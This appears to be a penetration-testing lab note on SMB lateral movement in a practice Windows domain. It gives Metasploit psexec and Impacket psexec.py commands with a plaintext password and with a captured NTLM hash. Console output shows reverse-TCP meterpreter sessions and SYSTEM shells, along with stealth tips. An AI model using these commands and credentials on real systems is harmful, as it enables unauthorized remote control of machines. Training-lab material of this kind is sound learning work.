#msfconsole #psexec #wmiexec #smbexec #SMB #NTLM 
# Through Metasploit - with a password
* `use exploit/windows/smb/psexec`

# Through Metasploit - with a hash
* `use exploit/windows/smb/psexec`


*Metasploit is very noisy. Use psexec tool instead and it is GOAT for being quieter and stealthy! Don't need it to be successful though.*

# Through psexec - with a password
* `psexec.py marvel.local/fcastle:'Password1'@10.0.0.25`

# Through psexec - with a hash
* `psexec.py administrator@10.0.0.25 -hashes LM:NT`




# MSF attack with password 

`msfconsole -q`

`search psexec type:exploit`

`use exploit/windows/smb/psexec`

`set payload windows/x64/meterpreter/reverse_tcp`

`set RHOSTS 192.168.95.133`

`set smbdomain MARVEL.local`

`set smbuser fcastle`

`set smbpass Password1`

`run`

results:

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.168.95.133   no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  MARVEL.local     no        The Windows domain to use for authentication
   SMBPass    Password1        no        The password for the specified username
   SMBUser    fcastle          no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.95.130   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.95.130:4444 
[*] 192.168.95.133:445 - Connecting to the server...
[*] 192.168.95.133:445 - Authenticating to 192.168.95.133:445|MARVEL.local as user 'fcastle'...
[*] 192.168.95.133:445 - Selecting PowerShell target
[*] 192.168.95.133:445 - Executing the payload...
[+] 192.168.95.133:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 192.168.95.133
[*] Meterpreter session 1 opened (192.168.95.130:4444 -> 192.168.95.133:50553) at 2024-06-26 14:16:23 -0700

meterpreter > shell
Process 1268 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We get a shell as `NT Authority\system`

We background the shell for later use:

```
C:\Windows\system32>exit
exit
meterpreter > background
[*] Backgrounding session 1...
```

Check sessions and return to shell

```
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ THEPUNISHER  192.168.95.130:4444 -> 192.168.95.133:50553 (192.168.95.133)


msf6 exploit(windows/smb/psexec) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
```

# MSF Attack with hash

`set smbuser administrator`

`unset smbdomain ` OR `set smbdomain .`

(See captured hashes from Relay attack, copy LM:NT parts of hash) 
`set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`

`run`

results:
```
msf6 exploit(windows/smb/psexec) > options
                                                                                                                                                            
Module options (exploit/windows/smb/psexec):                                                                                                                
                                                                                                                                                            
   Name                  Current Setting  Required  Description                                                                                             
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting                                Required  Description
   ----       ---------------                                --------  -----------
   RHOSTS     192.168.95.133                                 no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                                                       ing-metasploit.html
   RPORT      445                                            no        The target port (TCP)
   SMBDomain  .                                              no        The Windows domain to use for authentication
   SMBPass    aad3b435b51404eeaad3b435b51404ee:7facdc498ed1  no        The password for the specified username
              680c4fd1448319a8c04f
   SMBUser    administrator                                  no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.95.130   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.95.130:4444 
[*] 192.168.95.133:445 - Connecting to the server...
[*] 192.168.95.133:445 - Authenticating to 192.168.95.133:445 as user 'administrator'...
[*] 192.168.95.133:445 - Selecting PowerShell target
[*] 192.168.95.133:445 - Executing the payload...
[+] 192.168.95.133:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 192.168.95.133
[*] Meterpreter session 2 opened (192.168.95.130:4444 -> 192.168.95.133:50559) at 2024-06-26 14:22:19 -0700

meterpreter > shell
Process 11844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
We get a shell as `NT Authority\system`

# psexec.py with password

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(14:25:27)──> psexec.py MARVEL/fcastle:'Password1'@192.168.95.133                                                                         ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 192.168.95.133.....
[*] Found writable share ADMIN$
[*] Uploading file licyMJVy.exe
[*] Opening SVCManager on 192.168.95.133.....
[*] Creating service LnCt on 192.168.95.133.....
[*] Starting service LnCt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

Can do it without password, but have to enter it next:

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/3)─┐
└─(14:26:56)──> psexec.py MARVEL/fcastle:@192.168.95.133                                                                                    ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 192.168.95.133.....
[*] Found writable share ADMIN$
[*] Uploading file YmrhZMsE.exe
[*] Opening SVCManager on 192.168.95.133.....
[*] Creating service MZnN on 192.168.95.133.....
[*] Starting service MZnN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

# psexec.py with hash

```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(14:28:17)──> psexec.py administrator@192.168.95.133 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f            ──(Wed,Jun26)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 192.168.95.133.....
[*] Found writable share ADMIN$
[*] Uploading file kMvcOBFx.exe
[*] Opening SVCManager on 192.168.95.133.....
[*] Creating service OGHu on 192.168.95.133.....
[*] Starting service OGHu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

If psexec is blocked or not working, use `wmiexec.py` or `smbexec.py`

Don't need a shell on a machine to be successful
